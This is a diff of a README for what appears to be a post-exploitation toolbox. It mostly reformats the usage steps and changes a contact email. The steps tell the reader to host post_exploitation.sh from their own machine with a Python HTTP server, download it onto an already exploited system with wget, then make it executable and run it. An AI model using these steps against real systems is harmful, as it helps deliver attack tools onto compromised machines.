@@ -31,18 +31,14 @@ To deploy this project run
 ```
 After the shell is opened follow these instructions
 
-1-> Open a command terminal on your PC where the post_explotation.sh file is located and run 'pyhton -m http.server' to host the file
-
-2-> Now on the shell run 'wget http://Your-IP-Address:8000/post_exploitation.sh', it will transfer the file in the exploited system
-
-3-> Confirm that the file has been transferred using 'ls; command 
-
-4-> Now run chmod +x post_exploitation
-
-5-> Now run ./post_exploitation
+- Open a command terminal on your PC where the post_explotation.sh file is located and run 'pyhton -m http.server' to host the file
+- Now on the shell run 'wget http://Your-IP-Address:8000/post_exploitation.sh', it will transfer the file in the exploited system
+- Confirm that the file has been transferred using 'ls; command 
+- Now run chmod +x post_exploitation
+- Now run ./post_exploitation
 
 
-and it will output the python vulnerabilities scripts.
+``` and it will output the python vulnerabilities scripts. ```
 
 
 
@@ -57,10 +53,10 @@ Contributions to this project are welcome. Please fork the repository and submit
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 ## Contact
-For support or any questions, email us at support@example.com.
+For support or any questions, email us at info@cyberevangelists.com.
 
 
-This README provides a concise yet comprehensive guide to your toolbox, outlining its features, installation instructions, usage guide, and ways to contribute. Adjust the content according to your actual setup and repository details.
+``` This README provides a concise yet comprehensive guide to your toolbox, outlining its features, installation instructions, usage guide, and ways to contribute. Adjust the content according to your actual setup and repository details. ```
 
 
 
